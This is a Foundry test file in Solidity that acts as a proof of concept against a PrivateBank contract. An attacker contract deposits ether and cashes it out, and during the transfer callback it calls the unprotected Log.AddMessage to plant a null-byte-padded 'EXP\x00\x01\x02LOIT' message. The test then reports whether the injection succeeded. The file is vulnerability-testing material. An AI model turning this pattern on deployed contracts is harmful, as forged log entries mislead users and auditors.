// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xb93430ce38ac4a6bb47fb1fc085ea669353fd89e.sol";

contract AttackContract {
    PrivateBank public bank;
    Log public logContract;
    
    constructor(PrivateBank _bank, Log _logContract) {
        bank = _bank;
        logContract = _logContract;
    }
    
    function attack() public payable {
        // Deposit and withdraw to trigger callback
        bank.Deposit{value: msg.value}();
        bank.CashOut(msg.value);
    }
    
    receive() external payable {
        // Inject padded message during ether transfer
        logContract.AddMessage(address(this), msg.value, "EXP\x00\x01\x02LOIT");
    }
}

contract MessagePaddingTest is Test {
    PrivateBank public privateBank;
    Log public logContract;
    address internal attacker = address(0x2);
    
    function setUp() public {
        // Setup contracts
        logContract = new Log();
        privateBank = new PrivateBank(address(logContract));
    }

    function testMessagePaddingVulnerability() public {
        // Deploy attacker contract
        vm.startPrank(attacker);
        AttackContract attackerContract = new AttackContract(
            privateBank,
            logContract
        );
        vm.stopPrank();
        
        // Fund attack contract
        vm.deal(address(attackerContract), 1 ether);

        console2.log("--- BEFORE-Trigger: LastMsg Data ---");
        // Capture last log data BEFORE attack
        string memory dataBefore = logContract.LastMsg().Data;
        console2.log("Data Before:", dataBefore);

        console2.log("--- Trigger Attack ---");
        // Execute attack
        vm.prank(attacker);
        attackerContract.attack{value: 1 ether}();

        console2.log("--- AFTER-Trigger: LastMsg Data ---");
        // Capture last log data AFTER attack
        string memory dataAfter = logContract.LastMsg().Data;
        console2.log("Data After:", dataAfter);

        // Expected malicious payload
        bytes memory expectedData = "EXP\x00\x01\x02LOIT";
        bool changedToMalicious = 
            keccak256(bytes(dataAfter)) == keccak256(expectedData);
        console2.log("Payload injection result: ",
            changedToMalicious ? "SUCCESS" : "FAILURE");

        // Final vulnerability verdict
        if (changedToMalicious) {
            console2.log("Vulnerability Exists: Attack payload injected into logs");
        } else {
            console2.log("Vulnerability not Exist: Log data unaffected by attack");
        }
    }
}